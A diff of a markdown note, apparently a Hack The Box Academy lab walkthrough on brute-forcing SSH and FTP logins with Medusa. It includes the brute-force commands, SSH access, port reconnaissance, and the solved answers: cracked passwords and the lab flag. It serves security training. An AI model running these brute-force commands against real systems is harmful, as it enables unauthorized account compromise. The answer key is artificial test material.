@@ -1,20 +1,17 @@
 ---
 sticker: emoji//1f432
 ---
+In the dynamic landscape of cybersecurity, maintaining robust authentication mechanisms is paramount. While technologies like Secure Shell (`SSH`) and File Transfer Protocol (`FTP`) facilitate secure remote access and file management, they are often reliant on traditional username-password combinations, presenting potential vulnerabilities exploitable through brute-force attacks. In this module, we will delve into the practical application of `Medusa`, a potent brute-forcing tool, to systematically compromise both SSH and FTP services, thereby illustrating potential attack vectors and emphasizing the importance of fortified authentication practices.
 
-# Web Services
+`SSH` is a cryptographic network protocol that provides a secure channel for remote login, command execution, and file transfers over an unsecured network. Its strength lies in its encryption, which makes it significantly more secure than unencrypted protocols like `Telnet`. However, weak or easily guessable passwords can undermine SSH's security, exposing it to brute-force attacks.
 
-In the dynamic landscape of cybersecurity, maintaining robust authentication mechanisms is paramount. While technologies like Secure Shell (`SSH`) and File Transfer Protocol (`FTP`) facilitate secure remote access and file management, they are often reliant on traditional username-password combinations, presenting potential vulnerabilities exploitable through brute-force attacks. In this module, we will delve into the practical application of `Medusa`, a potent brute-forcing tool, to systematically compromise both SSH and FTP services, thereby illustrating potential attack vectors and emphasizing the importance of fortified authentication practices.
+`FTP` is a standard network protocol for transferring files between a client and a server on a computer network. It's also widely used for uploading and downloading files from websites. However, standard FTP transmits data, including login credentials, in cleartext, rendering it susceptible to interception and brute-forcing.
 
-`SSH` is a cryptographic network protocol that provides a secure channel for remote login, command execution, and file transfers over an unsecured network. Its strength lies in its encryption, which makes it significantly more secure than unencrypted protocols like `Telnet`. However, weak or easily guessable passwords can undermine SSH's security, exposing it to brute-force attacks.
-
-`FTP` is a standard network protocol for transferring files between a client and a server on a computer network. It's also widely used for uploading and downloading files from websites. However, standard FTP transmits data, including login credentials, in cleartext, rendering it susceptible to interception and brute-forcing.
-
-### Kick-off
+## Kick-off
 
 **To follow along, start the target system via the question section at the bottom of the page.**
 
-We begin our exploration by targeting an SSH server running on a remote system. Assuming prior knowledge of the username `sshuser`, we can leverage Medusa to attempt different password combinations until successful authentication is achieved systematically.
+We begin our exploration by targeting an SSH server running on a remote system. Assuming prior knowledge of the username `sshuser`, we can leverage Medusa to attempt different password combinations until successful authentication is achieved systematically.
 
 The following command serves as our starting point:
 
@@ -24,12 +21,12 @@ smoothment@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_
 
 Let's break down each component:
 
-* `-h <IP>`: Specifies the target system's IP address.
-* `-n <PORT>`: Defines the port on which the SSH service is listening (typically port 22).
-* `-u sshuser`: Sets the username for the brute-force attack.
-* `-P 2023-200_most_used_passwords.txt`: Points Medusa to a wordlist containing the 200 most commonly used passwords in 2023. The effectiveness of a brute-force attack is often tied to the quality and relevance of the wordlist used.
-* `-M ssh`: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
-* `-t 3`: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.
+- `-h <IP>`: Specifies the target system's IP address.
+- `-n <PORT>`: Defines the port on which the SSH service is listening (typically port 22).
+- `-u sshuser`: Sets the username for the brute-force attack.
+- `-P 2023-200_most_used_passwords.txt`: Points Medusa to a wordlist containing the 200 most commonly used passwords in 2023. The effectiveness of a brute-force attack is often tied to the quality and relevance of the wordlist used.
+- `-M ssh`: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
+- `-t 3`: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.
 
 ```shell-session
 smoothment@htb[/htb]$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
@@ -41,7 +38,7 @@ ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
 
 Upon execution, Medusa will display its progress as it cycles through the password combinations. The output will indicate a successful login, revealing the correct password.
 
-### Gaining Access
+## Gaining Access
 
 With the password in hand, establish an SSH connection using the following command and enter the found password when prompted:
 
@@ -51,12 +48,11 @@ smoothment@htb[/htb]$ ssh sshuser@<IP> -p PORT
 
 This command will initiate an interactive SSH session, granting you access to the remote system's command line.
 
-#### Expanding the Attack Surface
+### Expanding the Attack Surface
 
-Once inside the system, the next step is identifying other potential attack surfaces. Using `netstat` (within the SSH session) to list open ports and listening services, you discover a service running on port 21.
+Once inside the system, the next step is identifying other potential attack surfaces. Using `netstat` (within the SSH session) to list open ports and listening services, you discover a service running on port 21.
 
-&#x20;
-
+ 
 ```shell-session
 smoothment@htb[/htb]$ netstat -tulpn | grep LISTEN
 
@@ -65,7 +61,8 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 tcp6       0      0 :::21                   :::*                    LISTEN      -
 ```
 
-Further reconnaissance with `nmap` (within the SSH session) confirms this finding as an ftp server.
+Further reconnaissance with `nmap` (within the SSH session) confirms this finding as an ftp server.
+
 
 ```shell-session
 smoothment@htb[/htb]$ nmap localhost
@@ -82,11 +79,12 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
 ```
 
-#### Targeting the FTP Server
+### Targeting the FTP Server
 
 Having identified the FTP server, you can proceed to brute-force its authentication mechanism.
 
-If we explore the `/home` directory on the target system, we see an `ftpuser` folder, which implies the likelihood of the FTP server username being `ftpuser`. Based on this, we can modify our Medusa command accordingly:
+If we explore the `/home` directory on the target system, we see an `ftpuser` folder, which implies the likelihood of the FTP server username being `ftpuser`. Based on this, we can modify our Medusa command accordingly:
+
 
 ```shell-session
 smoothment@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
@@ -105,14 +103,15 @@ GENERAL: Medusa has finished.
 
 The key differences here are:
 
-* `-h 127.0.0.1`: Targets the local system, as the FTP server is running locally. Using the IP address tells medusa explicitly to use IPv4.
-* `-u ftpuser`: Specifies the username `ftpuser`.
-* `-M ftp`: Selects the FTP module within Medusa.
-* `-t 5`: Increases the number of parallel login attempts to 5.
+- `-h 127.0.0.1`: Targets the local system, as the FTP server is running locally. Using the IP address tells medusa explicitly to use IPv4.
+- `-u ftpuser`: Specifies the username `ftpuser`.
+- `-M ftp`: Selects the FTP module within Medusa.
+- `-t 5`: Increases the number of parallel login attempts to 5.
 
-#### Retrieving The Flag
+### Retrieving The Flag
 
-Upon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use the `get` command to download the `flag.txt` file, which may contain sensitive information.:
+Upon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use the `get` command to download the `flag.txt` file, which may contain sensitive information.:
+
 
 ```shell-session
 smoothment@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
@@ -148,17 +147,17 @@ smoothment@htb[/htb]$ cat flag.txt
 HTB{...}
 ```
 
-## Questions
+# Questions
+---
 
-***
-
-![](gitbook/cybersecurity/images/Pasted%20image%2020250213152556.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250213152556.png)
 
 Let's begin by launching the default medusa scan:
 
 ```
 medusa -h 94.237.54.164 -n 59668 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
 ```
+
 
 After a while, we get the following:
 
@@ -169,6 +168,7 @@ ACCOUNT CHECK: [ssh] Host: 94.237.54.164 (1 of 1, 0 complete) User: sshuser (1 o
 ACCOUNT CHECK: [ssh] Host: 94.237.54.164 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 1q2w3e4r5t (46 of 200 complete)
 ACCOUNT FOUND: [ssh] Host: 94.237.54.164 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
 ```
+
 
 We got credentials for ssh:
 
@@ -194,6 +194,7 @@ To restore this content, you can run the 'unminimize' command.
 Last login: Thu Feb 13 20:32:53 2025 from 10.30.18.26
 sshuser@ng-1340293-loginbfservice-amvfj-8678d96dc8-r66vm:~$
 ```
+
 
 Nice, we're in, let's look around, it's useful to check open ports and listening services, for this, we can use the following command:
 
@@ -228,6 +229,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds
 ```
 
 It was ftp indeed, machine also has medusa installed, this can help us brute force the login for ftp, if we check the home directory, we find this:
+
 
 ```
 sshuser@ng-1340293-loginbfservice-amvfj-8678d96dc8-r66vm:~$ ls /home
@@ -291,9 +293,11 @@ HTB{SSH_and_FTP_Bruteforce_Success}
 
 ```
 
-Nice, answers are:
+Nice, answers are: 
 
 ```ad-important
 1. `qqww1122`
 2. `HTB{SSH_and_FTP_Bruteforce_Success}`
 ```
+
+
